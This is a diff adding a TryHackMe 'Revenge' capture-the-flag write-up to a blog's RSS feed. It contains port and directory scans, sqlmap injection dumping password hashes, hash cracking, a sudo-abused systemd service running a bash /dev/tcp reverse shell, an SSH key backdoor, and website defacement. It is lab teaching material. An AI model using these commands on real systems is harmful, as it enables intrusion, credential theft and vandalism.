@@ -6,7 +6,297 @@
         <description>Recent content on Tanishq Chaudhary</description>
         <generator>Hugo -- gohugo.io</generator>
         <language>en-us</language>
-        <lastBuildDate>Sat, 26 Jun 2021 00:00:00 +0000</lastBuildDate><atom:link href="https://chaudhary1337.github.io/index.xml" rel="self" type="application/rss+xml" /><item>
+        <lastBuildDate>Sun, 27 Jun 2021 00:00:00 +0000</lastBuildDate><atom:link href="https://chaudhary1337.github.io/index.xml" rel="self" type="application/rss+xml" /><item>
+        <title>TryHackMe: Revenge Writeup</title>
+        <link>https://chaudhary1337.github.io/p/tryhackme-revenge-writeup/</link>
+        <pubDate>Sun, 27 Jun 2021 00:00:00 +0000</pubDate>
+        
+        <guid>https://chaudhary1337.github.io/p/tryhackme-revenge-writeup/</guid>
+        <description>&lt;img src="https://i.imgur.com/mCXuoCT.png" alt="Featured image of post TryHackMe: Revenge Writeup" /&gt;&lt;p&gt;&lt;a class=&#34;link&#34; href=&#34;https://tryhackme.com/room/revenge&#34;  target=&#34;_blank&#34; rel=&#34;noopener&#34;
+    &gt;Play&lt;/a&gt;&lt;/p&gt;
+&lt;p&gt;This room has a solid start:&lt;/p&gt;
+&lt;pre&gt;&lt;code&gt;To whom it may concern,
+
+I know it was you who hacked my blog.  I was really impressed with your skills.  You were a little sloppy 
+and left a bit of a footprint so I was able to track you down.  But, thank you for taking me up on my offer.  
+I&#39;ve done some initial enumeration of the site because I know *some* things about hacking but not enough.  
+For that reason, I&#39;ll let you do your own enumeration and checking.
+
+What I want you to do is simple.  Break into the server that&#39;s running the website and deface the front page.  
+I don&#39;t care how you do it, just do it.  But remember...DO NOT BRING DOWN THE SITE!  We don&#39;t want to cause irreparable damage.
+
+When you finish the job, you&#39;ll get the rest of your payment.  We agreed upon $5,000.  
+Half up-front and half when you finish.
+
+Good luck,
+
+Billy
+&lt;/code&gt;&lt;/pre&gt;&lt;h2 id=&#34;1-scanning--enumeration&#34;&gt;1. Scanning &amp;amp; Enumeration&lt;/h2&gt;
+&lt;p&gt;We do the below scans in parallel.&lt;/p&gt;
+&lt;h3 id=&#34;11-port-scanning&#34;&gt;1.1. Port Scanning&lt;/h3&gt;
+&lt;pre&gt;&lt;code&gt;Not shown: 998 closed ports
+PORT   STATE SERVICE VERSION
+22/tcp open  ssh     OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
+| ssh-hostkey: 
+|   2048 72:53:b7:7a:eb:ab:22:70:1c:f7:3c:7a:c7:76:d9:89 (RSA)
+|   256 43:77:00:fb:da:42:02:58:52:12:7d:cd:4e:52:4f:c3 (ECDSA)
+|_  256 2b:57:13:7c:c8:4f:1d:c2:68:67:28:3f:8e:39:30:ab (ED25519)
+80/tcp open  http    nginx 1.14.0 (Ubuntu)
+|_http-favicon: Unknown favicon MD5: E859DC70A208F0F0242640410296E06A
+| http-methods: 
+|_  Supported Methods: HEAD GET OPTIONS
+|_http-server-header: nginx/1.14.0 (Ubuntu)
+|_http-title: Home | Rubber Ducky Inc.
+Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
+&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;Info gathered:&lt;/p&gt;
+&lt;ul&gt;
+&lt;li&gt;port 22 open with SSH running&lt;/li&gt;
+&lt;li&gt;port 80 open with http running&lt;/li&gt;
+&lt;/ul&gt;
+&lt;p&gt;A complete port scan does not reveal any more information.&lt;/p&gt;
+&lt;h3 id=&#34;12-web-enumeration&#34;&gt;1.2. Web Enumeration&lt;/h3&gt;
+&lt;p&gt;Gobuster scan:&lt;/p&gt;
+&lt;pre&gt;&lt;code&gt;┌──(kali㉿kali)-[~]
+└─$ gobuster dir -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -x &#39;php,html,txt&#39; -t 108 -q -u 10.10.212.230
+/index                (Status: 200) [Size: 8541]
+/login                (Status: 200) [Size: 4980]
+/contact              (Status: 200) [Size: 6906]
+/products             (Status: 200) [Size: 7254]
+/static               (Status: 301) [Size: 194] [--&amp;gt; http://10.10.212.230/static/]
+/admin                (Status: 200) [Size: 4983]                                  
+/requirements.txt     (Status: 200) [Size: 258]
+&lt;/code&gt;&lt;/pre&gt;&lt;h3 id=&#34;13-web-exploration&#34;&gt;1.3. Web Exploration&lt;/h3&gt;
+&lt;p&gt;home page of rubber ducky
+&lt;img src=&#34;https://i.imgur.com/PY9GOnn.jpg&#34; alt=&#34;home page of rubber ducky&#34;  /&gt;&lt;/p&gt;
+&lt;p&gt;Login page redirects to an &lt;code&gt;action=#&lt;/code&gt; in the url.
+&lt;img src=&#34;https://i.imgur.com/mx5kY2I.png&#34; alt=&#34;login page redirects to an &amp;lt;code&amp;gt;action=#&amp;lt;/code&amp;gt; in the url&#34;  /&gt;&lt;/p&gt;
+&lt;p&gt;&lt;code&gt;requirements.txt&lt;/code&gt; file:&lt;/p&gt;
+&lt;pre&gt;&lt;code&gt;attrs==19.3.0
+bcrypt==3.1.7
+cffi==1.14.1
+click==7.1.2
+Flask==1.1.2
+Flask-Bcrypt==0.7.1
+Flask-SQLAlchemy==2.4.4
+itsdangerous==1.1.0
+Jinja2==2.11.2
+MarkupSafe==1.1.1
+pycparser==2.20
+PyMySQL==0.10.0
+six==1.15.0
+SQLAlchemy==1.3.18
+Werkzeug==1.0.1
+&lt;/code&gt;&lt;/pre&gt;&lt;h3 id=&#34;14-sub-domain-fuzzing-fail-can-be-skipped&#34;&gt;1.4. Sub-domain Fuzzing (fail) (can be skipped)&lt;/h3&gt;
+&lt;p&gt;Add the line &lt;code&gt;10.10.212.230   ducky.thm&lt;/code&gt; to the &lt;code&gt;/etc/hosts&lt;/code&gt; file.&lt;/p&gt;
+&lt;pre&gt;&lt;code&gt;┌──(kali㉿kali)-[~]
+└─$ cat /etc/hosts 
+127.0.0.1       localhost
+127.0.1.1       kali
+10.10.212.230   ducky.thm
+# The following lines are desirable for IPv6 capable hosts
+::1     localhost ip6-localhost ip6-loopback
+ff02::1 ip6-allnodes
+ff02::2 ip6-allrouters
+&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;We find any subdomains by using &lt;code&gt;wfuzz&lt;/code&gt;: &lt;code&gt;wfuzz -c -w ~/Desktop/tools/files/subdomains-top1million-5000.txt -u &#39;http://ducky.thm/&#39; -H &amp;quot;Host: FUZZ.ducky.thm&amp;quot;&lt;/code&gt;&lt;/p&gt;
+&lt;p&gt;Here&amp;rsquo;s whats happening:&lt;/p&gt;
+&lt;ul&gt;
+&lt;li&gt;-c is for color&lt;/li&gt;
+&lt;li&gt;-w is for wordlist&lt;/li&gt;
+&lt;li&gt;-H is for host&lt;/li&gt;
+&lt;li&gt;-u is for URL&lt;/li&gt;
+&lt;li&gt;FUZZ is replaced by the item in the wordlist&lt;/li&gt;
+&lt;/ul&gt;
+&lt;pre&gt;&lt;code&gt;┌──(kali㉿kali)-[~]
+└─$ wfuzz -c -w ~/Desktop/tools/files/subdomains-top1million-5000.txt -u &#39;http://ducky.thm/&#39; -H &amp;quot;Host: FUZZ.ducky.thm&amp;quot; --hw 636
+ /usr/lib/python3/dist-packages/wfuzz/__init__.py:34: UserWarning:Pycurl is not compiled against Openssl. Wfuzz might not work correctly when fuzzing SSL sites. Check Wfuzz&#39;s documentation for more information.
+********************************************************
+* Wfuzz 3.1.0 - The Web Fuzzer                         *
+********************************************************
+
+Target: http://ducky.thm/
+Total requests: 4989
+
+=====================================================================
+ID           Response   Lines    Word       Chars       Payload                                                 
+=====================================================================
+
+
+Total time: 0
+Processed Requests: 4989
+Filtered Requests: 4989
+Requests/sec.: 0
+&lt;/code&gt;&lt;/pre&gt;&lt;h3 id=&#34;15-sqli-fail-can-be-skipped&#34;&gt;1.5. SQLI (fail) (can be skipped)&lt;/h3&gt;
+&lt;p&gt;We can check for SQL Injection vulnerabilities using SQLmap: &lt;code&gt;sqlmap -u http://10.10.212.230/admin --forms --dump-all&lt;/code&gt;&lt;/p&gt;
+&lt;p&gt;However,&lt;/p&gt;
+&lt;pre&gt;&lt;code&gt;[ERROR] all tested parameters do not appear to be injectable.
+&lt;/code&gt;&lt;/pre&gt;&lt;h3 id=&#34;16-login-page-exploration-fail-can-be-skipped&#34;&gt;1.6. Login Page Exploration (Fail) (can be skipped)&lt;/h3&gt;
+&lt;pre&gt;&lt;code&gt;GET /login?action= HTTP/1.1
+Host: 10.10.212.230
+Upgrade-Insecure-Requests: 1
+User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/88.0.4324.150 Safari/537.36
+Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9
+Referer: http://10.10.212.230/login
+Accept-Encoding: gzip, deflate
+Accept-Language: en-US,en;q=0.9
+Connection: close
+&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;Looks like &amp;hellip; the username and password is not being sent at all?!&lt;/p&gt;
+&lt;p&gt;This means that we are looking at something else &amp;hellip;
+Even in sqlmap, I noticed the form that was being epxloited was the &lt;code&gt;GET&lt;/code&gt; form,&lt;/p&gt;
+&lt;pre&gt;&lt;code&gt;[01:25:18] [INFO] searching for forms
+[#1] form:
+GET http://10.10.212.230/login?action=
+&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;This means that we want to fill in and add parameters for &lt;code&gt;username&lt;/code&gt; and &lt;code&gt;password&lt;/code&gt;.&lt;/p&gt;
+&lt;p&gt;Perhaps something like this: http://10.10.212.230/login?username=&amp;amp;password=&amp;amp;action=&lt;/p&gt;
+&lt;p&gt;Oh! And recall we had &lt;code&gt;pymysql&lt;/code&gt; present in the &lt;code&gt;requirements.txt&lt;/code&gt; file. This means we are using MySQL as the database.&lt;/p&gt;
+&lt;p&gt;So I tried and then tried some more but it failed. What next? Well I noticed something interesting back in the error pages.&lt;/p&gt;
+&lt;h3 id=&#34;17-error-error&#34;&gt;1.7. Error! Error!&lt;/h3&gt;
+&lt;p&gt;You see, the &lt;code&gt;/products/1&lt;/code&gt; page is fine, but &lt;code&gt;/products/100&lt;/code&gt; page gives a 500 error. This is server side error.
+&lt;img src=&#34;https://i.imgur.com/WkcowAt.png&#34; alt=&#34;500 error code seen on non existent product&#34;  /&gt;&lt;/p&gt;
+&lt;p&gt;On the other hand, a page like &lt;code&gt;/pwn&lt;/code&gt; gives:
+&lt;img src=&#34;https://i.imgur.com/mEnYPNA.png&#34; alt=&#34;404 error code not found&#34;  /&gt;&lt;/p&gt;
+&lt;p&gt;See the difference? Maybe, what we are looking for, is an attack on the &lt;code&gt;/products/&lt;/code&gt; page!&lt;/p&gt;
+&lt;p&gt;Run: &lt;code&gt;sqlmap -u http://10.10.212.230/products/1  --dump&lt;/code&gt;&lt;/p&gt;
+&lt;pre&gt;&lt;code&gt;Database: duckyinc
+Table: system_user
+[3 entries]
++----+----------------------+--------------+--------------------------------------------------------------+
+| id | email                | username     | _password                                                    |
++----+----------------------+--------------+--------------------------------------------------------------+
+| 1  | sadmin@duckyinc.org  | server-admin | {hash_was_here!} |
+| 2  | kmotley@duckyinc.org | kmotley      | $2a$12$LEENY/LWOfyxyCBUlfX8Mu8viV9mGUse97L8x.4L66e9xwzzHfsQa |
+| 3  | dhughes@duckyinc.org | dhughes      | $2a$12$22xS/uDxuIsPqrRcxtVmi.GR2/xh0xITGdHuubRF4Iilg5ENAFlcK |
++----+----------------------+--------------+--------------------------------------------------------------+
+&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;In the &lt;code&gt;user&lt;/code&gt; table we get the first flag :D&lt;/p&gt;
+&lt;h3 id=&#34;hash-cracking&#34;&gt;Hash Cracking&lt;/h3&gt;
+&lt;pre&gt;&lt;code&gt;┌──(kali㉿kali)-[/tmp]
+└─$ john hash --wordlist=/usr/share/wordlists/rockyou.txt
+Using default input encoding: UTF-8
+Loaded 1 password hash (bcrypt [Blowfish 32/64 X3])
+Cost 1 (iteration count) is 256 for all loaded hashes
+Will run 6 OpenMP threads
+Press &#39;q&#39; or Ctrl-C to abort, almost any other key for status
+{hidden}         (?)
+1g 0:00:00:00 DONE (2021-06-27 01:49) 3.846g/s 1038p/s 1038c/s 1038C/s hellokitty..hotmail
+Use the &amp;quot;--show&amp;quot; option to display all of the cracked passwords reliably
+Session completed
+&lt;/code&gt;&lt;/pre&gt;&lt;h2 id=&#34;2-foothold&#34;&gt;2. Foothold&lt;/h2&gt;
+&lt;p&gt;We know the &lt;code&gt;/login&lt;/code&gt; and the &lt;code&gt;/admin&lt;/code&gt; pages are completely useless. That leaves us with SSH.&lt;/p&gt;
+&lt;p&gt;After lots of manual bruteforcing, I found the username is actually &lt;code&gt;server-admin&lt;/code&gt; and not &lt;code&gt;sadmin&lt;/code&gt;.&lt;/p&gt;
+&lt;pre&gt;&lt;code&gt;┌──(kali㉿kali)-[/tmp]
+└─$ ssh server-admin@10.10.212.230
+server-admin@10.10.212.230&#39;s password: 
+Welcome to Ubuntu 18.04.5 LTS (GNU/Linux 4.15.0-112-generic x86_64)
+
+ * Documentation:  https://help.ubuntu.com
+ * Management:     https://landscape.canonical.com
+ * Support:        https://ubuntu.com/advantage
+
+ System information disabled due to load higher than 1.0
+
+
+8 packages can be updated.
+0 updates are security updates.
+
+
+################################################################################
+#                        Ducky Inc. Web Server 00080012                        #
+#            This server is for authorized Ducky Inc. employees only           #
+#                  All actiions are being monitored and recorded               #
+#                    IP and MAC addresses have been logged                     #
+################################################################################
+Last login: Wed Aug 12 20:09:36 2020 from 192.168.86.65
+server-admin@duckyinc:~$
+&lt;/code&gt;&lt;/pre&gt;&lt;h3 id=&#34;21-exploration&#34;&gt;2.1. Exploration&lt;/h3&gt;
+&lt;p&gt;&lt;strong&gt;Users&lt;/strong&gt;&lt;/p&gt;
+&lt;pre&gt;&lt;code&gt;server-admin@duckyinc:~$ ls /home
+server-admin
+&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;&lt;strong&gt;crontab&lt;/strong&gt;&lt;/p&gt;
+&lt;pre&gt;&lt;code&gt;server-admin@duckyinc:~$ cat /etc/crontab
+# /etc/crontab: system-wide crontab
+# Unlike any other crontab you don&#39;t have to run the `crontab&#39;
+# command to install the new version when you edit this file
+# and files in /etc/cron.d. These files also have username fields,
+# that none of the other crontabs do.
+
+SHELL=/bin/sh
+PATH=/usr/local/sbin:/usr/local/bin:/sbin:/bin:/usr/sbin:/usr/bin
+
+# m h dom mon dow user  command
+17 *    * * *   root    cd / &amp;amp;&amp;amp; run-parts --report /etc/cron.hourly
+25 6    * * *   root    test -x /usr/sbin/anacron || ( cd / &amp;amp;&amp;amp; run-parts --report /etc/cron.daily )
+47 6    * * 7   root    test -x /usr/sbin/anacron || ( cd / &amp;amp;&amp;amp; run-parts --report /etc/cron.weekly )
+52 6    1 * *   root    test -x /usr/sbin/anacron || ( cd / &amp;amp;&amp;amp; run-parts --report /etc/cron.monthly )
+#
+&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;&lt;strong&gt;SUID&lt;/strong&gt;&lt;/p&gt;
+&lt;pre&gt;&lt;code&gt;server-admin@duckyinc:~$ find / -type f -perm -u=s 2&amp;gt; /dev/null
+/usr/bin/newgidmap
+/usr/bin/newuidmap
+/usr/bin/sudo
+/usr/bin/pkexec
+/usr/bin/chsh
+/usr/bin/traceroute6.iputils
+/usr/bin/at
+/usr/bin/gpasswd
+/usr/bin/chfn
+/usr/bin/newgrp
+/usr/bin/passwd
+/usr/lib/openssh/ssh-keysign
+/usr/lib/policykit-1/polkit-agent-helper-1
+/usr/lib/x86_64-linux-gnu/lxc/lxc-user-nic
+/usr/lib/eject/dmcrypt-get-device
+/usr/lib/snapd/snap-confine
+/usr/lib/dbus-1.0/dbus-daemon-launch-helper
+&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;&lt;strong&gt;SUDO&lt;/strong&gt;&lt;/p&gt;
+&lt;pre&gt;&lt;code&gt;server-admin@duckyinc:~$ sudo -l
+[sudo] password for server-admin: 
+Matching Defaults entries for server-admin on duckyinc:
+    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin
+
+User server-admin may run the following commands on duckyinc:
+    (root) /bin/systemctl start duckyinc.service, /bin/systemctl enable duckyinc.service, /bin/systemctl restart
+        duckyinc.service, /bin/systemctl daemon-reload, sudoedit /etc/systemd/system/duckyinc.service
+&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;Great! Looks like we have a way to root!&lt;/p&gt;
+&lt;h2 id=&#34;3-privesc&#34;&gt;3. PrivEsc&lt;/h2&gt;
+&lt;h3 id=&#34;31-getting-root&#34;&gt;3.1. Getting root&lt;/h3&gt;
+&lt;p&gt;Type in: &lt;code&gt;sudoedit /etc/systemd/system/duckyinc.service&lt;/code&gt; and replace the contents with the below.&lt;/p&gt;
+&lt;pre&gt;&lt;code&gt;[Unit]
+Description=pwn
+
+[Service]
+Type=simple
+User=root
+ExecStart=/bin/bash -c &#39;bash -i &amp;gt;&amp;amp; /dev/tcp/IP/1337 0&amp;gt;&amp;amp;1&#39;
+
+[Install]
+WantedBy=multi-user.target
+&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;Make sure to replace the IP as per your attacking machine. Also, start a listener &lt;code&gt;nc -lnvp 1337&lt;/code&gt;&lt;/p&gt;
+&lt;p&gt;I did the following,&lt;/p&gt;
+&lt;pre&gt;&lt;code&gt;server-admin@duckyinc:~$ sudo /bin/systemctl daemon-reload
+server-admin@duckyinc:~$ sudo /bin/systemctl enable duckyinc.service
+server-admin@duckyinc:~$ sudo /bin/systemctl restart duckyinc.service
+server-admin@duckyinc:~$ sudo /bin/systemctl start duckyinc.service
+&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;And we have the shell!&lt;/p&gt;
+&lt;pre&gt;&lt;code&gt;┌──(kali㉿kali)-[~]
+└─$ nc -lnvp 1337         
+listening on [any] 1337 ...
+connect to [10.17.8.184] from (UNKNOWN) [10.10.212.230] 44520
+bash: cannot set terminal process group (16663): Inappropriate ioctl for device
+bash: no job control in this shell
+root@duckyinc:/# cd /root
+cd /root
+root@duckyinc:~# ls
+&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;Feel free to &lt;code&gt;root@duckyinc:~/.ssh# echo &amp;quot;{your_own_id_rsa.pub_key_here}&amp;quot; &amp;gt;&amp;gt; authorized_keys&lt;/code&gt; for a ssh login.&lt;/p&gt;
+&lt;h3 id=&#34;32-defacing-website&#34;&gt;3.2. Defacing Website&lt;/h3&gt;
+&lt;pre&gt;&lt;code&gt;root@duckyinc:/var/www/duckyinc/templates# echo &amp;quot;pwned by chaudhary1337&amp;quot; &amp;gt; index.html
+root@duckyinc:/var/www/duckyinc/templates# cd ~
+root@duckyinc:~# ls
+flag3.txt
+root@duckyinc:~# cat flag3.txt 
+thm{yeee}
+&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;System compromised&lt;/p&gt;
+</description>
+        </item>
+        <item>
         <title>TryHackMe: Inferno Writeup</title>
         <link>https://chaudhary1337.github.io/p/tryhackme-inferno-writeup/</link>
         <pubDate>Sat, 26 Jun 2021 00:00:00 +0000</pubDate>
